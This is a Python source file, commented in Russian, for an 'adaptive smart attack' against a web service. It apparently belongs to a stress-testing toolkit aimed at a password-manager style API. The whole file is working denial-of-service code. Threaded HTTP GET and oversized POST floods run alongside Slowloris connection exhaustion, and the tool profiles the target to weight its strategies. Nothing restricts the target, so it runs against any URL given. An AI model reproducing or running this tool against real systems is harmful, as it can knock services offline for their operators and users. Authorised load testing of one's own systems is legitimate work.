import requests
import threading
import time
import random
import json
import socket
from colorama import Fore, Style, init
from utils.metrics import metrics_collector
from utils.test_data import test_data_generator

# Инициализация colorama для цветного вывода
init(autoreset=True)

class SmartAttack:
    """Умная адаптивная атака, комбинирующая различные стратегии"""
    
    def __init__(self, target_url: str, threads: int = 15, duration: int = 300):
        self.target_url = target_url
        self.threads = threads
        self.duration = duration
        self.running = False
        
        # Извлекаем хост и порт
        if "://" in target_url:
            self.host = target_url.split("://")[1].split(":")[0]
            self.port = int(target_url.split(":")[-1]) if ":" in target_url.split("://")[1] else 80
        else:
            self.host = target_url.split(":")[0]
            self.port = int(target_url.split(":")[1]) if ":" in target_url else 80
        
        # Статистика атак
        self.stats = {
            "http_flood": {"requests": 0, "success": 0, "avg_response": 0},
            "post_flood": {"requests": 0, "success": 0, "avg_response": 0},
            "slowloris": {"connections": 0, "success": 0, "duration": 0},
            "hybrid": {"requests": 0, "success": 0, "avg_response": 0}
        }
        
        # Доступные эндпоинты
        self.endpoints = {
            "get": ["/auth/health", "/api/passwords", "/api/notes", "/api/backup/export"],
            "post": ["/auth/register", "/auth/login", "/auth/sync-setup", "/auth/verify-otp", 
                    "/auth/cloud-login", "/api/passwords", "/api/notes", "/api/backup/import"]
        }
        
        # Адаптивные параметры
        self.success_rate = 0.0
        self.avg_response_time = 0.0
        self.strategy_weights = {
            "http_flood": 0.25,
            "post_flood": 0.25,
            "slowloris": 0.25,
            "hybrid": 0.25
        }
    
    def analyze_target(self):
        """Анализирует цель для выбора оптимальной стратегии"""
        print(f"{Fore.CYAN}🔍 Анализ цели {self.target_url}...")
        
        try:
            # Тестовый запрос для определения характеристик сервера
            start_time = time.time()
            response = requests.get(f"{self.target_url}/auth/health", timeout=5)
            response_time = time.time() - start_time
            
            print(f"{Fore.GREEN}✅ Сервер отвечает (HTTP {response.status_code}) за {response_time:.3f}с")
            
            # Анализируем заголовки ответа
            server_header = response.headers.get('Server', 'Unknown')
            connection_header = response.headers.get('Connection', 'Unknown')
            
            print(f"{Fore.YELLOW}📋 Сервер: {server_header}")
            print(f"{Fore.YELLOW}📋 Соединение: {connection_header}")
            
            # Адаптируем веса стратегий на основе анализа
            if response_time > 1.0:
                # Медленный сервер - больше slowloris
                self.strategy_weights["slowloris"] = 0.4
                self.strategy_weights["post_flood"] = 0.3
                print(f"{Fore.YELLOW}⚡ Обнаружен медленный сервер - приоритет Slowloris")
            elif response_time < 0.1:
                # Быстрый сервер - больше flood атак
                self.strategy_weights["http_flood"] = 0.35
                self.strategy_weights["post_flood"] = 0.35
                print(f"{Fore.YELLOW}⚡ Обнаружен быстрый сервер - приоритет Flood атакам")
            
            return True
            
        except Exception as e:
            print(f"{Fore.RED}❌ Ошибка анализа цели: {str(e)}")
            return False
    
    def adaptive_http_flood(self, thread_id: int, requests_count: int):
        """Адаптивная HTTP flood атака"""
        success_count = 0
        total_response_time = 0
        
        for i in range(requests_count):
            if not self.running:
                break
                
            try:
                endpoint = random.choice(self.endpoints["get"])
                url = self.target_url + endpoint
                
                headers = test_data_generator.get_random_headers()
                
                # Адаптивные параметры запроса
                params = {}
                if random.random() < 0.3:  # 30% шанс добавить параметры
                    params = {
                        "page": random.randint(1, 100),
                        "size": random.randint(1, 1000),
                        "search": "x" * random.randint(10, 100)
                    }
                
                start_time = time.time()
                response = requests.get(url, headers=headers, params=params, timeout=5)
                response_time = time.time() - start_time
                
                metrics_collector.add_metric(
                    response_time=response_time,
                    status_code=response.status_code,
                    size=len(response.content),
                    attack_type="SMART_HTTP",
                    endpoint=endpoint
                )
                
                self.stats["http_flood"]["requests"] += 1
                total_response_time += response_time
                
                if response.status_code < 400:
                    success_count += 1
                    self.stats["http_flood"]["success"] += 1
                    print(f"{Fore.GREEN}🌊 [{thread_id}] HTTP: {response.status_code} {endpoint} ({response_time:.3f}s)")
                else:
                    print(f"{Fore.RED}🌊 [{thread_id}] HTTP: {response.status_code} {endpoint}")
                
                time.sleep(random.uniform(0.01, 0.1))
                
            except Exception as e:
                metrics_collector.add_metric(0, 0, 0, "SMART_HTTP", endpoint, str(e))
                print(f"{Fore.RED}💥 [{thread_id}] HTTP Error: {str(e)}")
        
        if self.stats["http_flood"]["requests"] > 0:
            self.stats["http_flood"]["avg_response"] = total_response_time / self.stats["http_flood"]["requests"]
    
    def adaptive_post_flood(self, thread_id: int, requests_count: int):
        """Адаптивная POST flood атака"""
        success_count = 0
        total_response_time = 0
        
        for i in range(requests_count):
            if not self.running:
                break
                
            try:
                endpoint = random.choice(self.endpoints["post"])
                url = self.target_url + endpoint
                
                headers = test_data_generator.get_random_headers()
                headers["Content-Type"] = "application/json"
                
                # Получаем подходящие данные для эндпоинта
                post_data = test_data_generator.get_random_endpoint_data(endpoint)
                
                # Адаптивное увеличение размера данных
                if random.random() < 0.4:  # 40% шанс добавить большие данные
                    post_data["bulkData"] = "x" * random.randint(1000, 10000)
                    post_data["arrays"] = [f"item_{j}" for j in range(random.randint(10, 100))]
                
                start_time = time.time()
                response = requests.post(url, headers=headers, json=post_data, timeout=10)
                response_time = time.time() - start_time
                
                metrics_collector.add_metric(
                    response_time=response_time,
                    status_code=response.status_code,
                    size=len(response.content),
                    attack_type="SMART_POST",
                    endpoint=endpoint
                )
                
                self.stats["post_flood"]["requests"] += 1
                total_response_time += response_time
                
                if response.status_code < 400:
                    success_count += 1
                    self.stats["post_flood"]["success"] += 1
                    print(f"{Fore.MAGENTA}📮 [{thread_id}] POST: {response.status_code} {endpoint} ({response_time:.3f}s)")
                else:
                    print(f"{Fore.RED}📮 [{thread_id}] POST: {response.status_code} {endpoint}")
                
                time.sleep(random.uniform(0.05, 0.2))
                
            except Exception as e:
                metrics_collector.add_metric(0, 0, 0, "SMART_POST", endpoint, str(e))
                print(f"{Fore.RED}💥 [{thread_id}] POST Error: {str(e)}")
        
        if self.stats["post_flood"]["requests"] > 0:
            self.stats["post_flood"]["avg_response"] = total_response_time / self.stats["post_flood"]["requests"]
    
    def adaptive_slowloris(self, thread_id: int, connections_count: int):
        """Адаптивная Slowloris атака"""
        sockets = []
        successful_connections = 0
        
        # Устанавливаем соединения
        for i in range(connections_count):
            if not self.running:
                break
                
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.host, self.port))
                
                # Отправляем начальный HTTP запрос
                endpoint = random.choice(self.endpoints["get"])
                initial_request = f"GET {endpoint} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
                sock.send(initial_request.encode('utf-8'))
                
                sockets.append(sock)
                successful_connections += 1
                
                print(f"{Fore.RED}🐌 [{thread_id}] Slowloris соединение {i+1} установлено")
                time.sleep(random.uniform(0.1, 0.3))
                
            except Exception as e:
                print(f"{Fore.RED}❌ [{thread_id}] Slowloris connection failed: {str(e)}")
        
        self.stats["slowloris"]["connections"] += successful_connections
        
        # Поддерживаем соединения
        start_time = time.time()
        headers_to_send = [
            "User-Agent: Mozilla/5.0 (Smart Attack Bot)",
            "Accept: text/html,application/xhtml+xml",
            "Accept-Language: en-us,en;q=0.5",
            "Accept-Encoding: gzip,deflate",
            "Connection: keep-alive"
        ]
        
        while self.running and (time.time() - start_time) < 60:  # 60 секунд удержания
            for i, sock in enumerate(sockets[:]):
                if not self.running:
                    break
                    
                try:
                    header = random.choice(headers_to_send)
                    sock.send(f"{header}\r\n".encode('utf-8'))
                    
                    metrics_collector.add_metric(
                        response_time=time.time() - start_time,
                        status_code=200,
                        size=len(header),
                        attack_type="SMART_SLOWLORIS",
                        endpoint="slow_connection"
                    )
                    
                    print(f"{Fore.RED}🐌 [{thread_id}] Slowloris header sent to connection {i}")
                    
                except Exception as e:
                    sockets.remove(sock)
                    print(f"{Fore.RED}🐌 [{thread_id}] Slowloris connection {i} lost")
            
            time.sleep(random.uniform(5, 15))
        
        # Закрываем соединения
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
        
        duration = time.time() - start_time
        self.stats["slowloris"]["duration"] += duration
        if successful_connections > 0:
            self.stats["slowloris"]["success"] += 1
    
    def hybrid_attack(self, thread_id: int, requests_count: int):
        """Гибридная атака, смешивающая GET и POST запросы"""
        for i in range(requests_count):
            if not self.running:
                break
                
            # Случайно выбираем между GET и POST
            if random.choice([True, False]):
                self.adaptive_http_flood(thread_id, 1)
            else:
                self.adaptive_post_flood(thread_id, 1)
            
            self.stats["hybrid"]["requests"] += 1
            
            # Адаптивная пауза
            time.sleep(random.uniform(0.01, 0.5))
    
    def attack_thread(self, thread_id: int):
        """Основной поток атаки с адаптивным выбором стратегии"""
        print(f"{Fore.YELLOW}🚀 Умный поток {thread_id} запущен")
        
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < self.duration:
            # Выбираем стратегию на основе весов
            strategy = random.choices(
                list(self.strategy_weights.keys()),
                weights=list(self.strategy_weights.values())
            )[0]
            
            if strategy == "http_flood":
                self.adaptive_http_flood(thread_id, random.randint(5, 15))
            elif strategy == "post_flood":
                self.adaptive_post_flood(thread_id, random.randint(3, 10))
            elif strategy == "slowloris":
                self.adaptive_slowloris(thread_id, random.randint(2, 5))
            elif strategy == "hybrid":
                self.hybrid_attack(thread_id, random.randint(5, 15))
            
            # Адаптивная пауза между стратегиями
            time.sleep(random.uniform(1, 5))
        
        print(f"{Fore.BLUE}🏁 Умный поток {thread_id} завершен")
    
    def run(self):
        """Запуск умной атаки"""
        print(f"\n{Fore.LIGHTMAGENTA_EX}{'='*60}")
        print(f"{Fore.LIGHTMAGENTA_EX}🧠 ЗАПУСК УМНОЙ АДАПТИВНОЙ АТАКИ")
        print(f"{Fore.LIGHTMAGENTA_EX}{'='*60}")
        print(f"{Fore.WHITE}Цель: {self.target_url}")
        print(f"{Fore.WHITE}Потоков: {self.threads}")
        print(f"{Fore.WHITE}Продолжительность: {self.duration} секунд")
        print(f"{Fore.WHITE}Стратегии: HTTP Flood, POST Flood, Slowloris, Hybrid")
        print(f"{Fore.LIGHTMAGENTA_EX}{'='*60}")
        
        # Анализируем цель
        if not self.analyze_target():
            print(f"{Fore.RED}❌ Не удалось проанализировать цель")
            return None
        
        print(f"\n{Fore.CYAN}🎯 Веса стратегий:")
        for strategy, weight in self.strategy_weights.items():
            print(f"{Fore.CYAN}  {strategy}: {weight:.2f}")
        
        # Очищаем предыдущие метрики
        metrics_collector.clear()
        
        self.running = True
        
        # Запускаем потоки
        threads = []
        start_time = time.time()
        
        for i in range(self.threads):
            thread = threading.Thread(target=self.attack_thread, args=(i+1,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        try:
            # Ждем завершения времени атаки
            time.sleep(self.duration)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⏹️  Атака прервана пользователем")
        finally:
            self.running = False
        
        # Ждем завершения потоков
        for thread in threads:
            thread.join(timeout=10)
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Выводим итоговую статистику
        print(f"\n{Fore.LIGHTMAGENTA_EX}{'='*60}")
        print(f"{Fore.LIGHTMAGENTA_EX}📊 РЕЗУЛЬТАТЫ УМНОЙ АТАКИ")
        print(f"{Fore.LIGHTMAGENTA_EX}{'='*60}")
        print(f"{Fore.WHITE}Время выполнения: {duration:.2f} секунд")
        
        for strategy, stats in self.stats.items():
            if stats["requests"] > 0 or stats.get("connections", 0) > 0:
                print(f"\n{Fore.CYAN}📈 {strategy.upper()}:")
                if "requests" in stats and stats["requests"] > 0:
                    print(f"  Запросов: {stats['requests']}")
                    print(f"  Успешных: {stats['success']}")
                    print(f"  Среднее время: {stats['avg_response']:.3f}с")
                if "connections" in stats and stats["connections"] > 0:
                    print(f"  Соединений: {stats['connections']}")
                    print(f"  Время удержания: {stats['duration']:.2f}с")
        
        print(f"{Fore.LIGHTMAGENTA_EX}{'='*60}")
        
        # Сохраняем метрики
        timestamp = int(time.time())
        csv_filename = f"metrics/smart_attack_{timestamp}.csv"
        metrics_collector.save_to_csv(csv_filename)
        metrics_collector.print_stats()
        
        return csv_filename


def run(target_url: str, threads: int = 15, duration: int = 300):
    """Функция для запуска умной атаки (совместимость с меню)"""
    attack = SmartAttack(target_url, threads, duration)
    return attack.run() 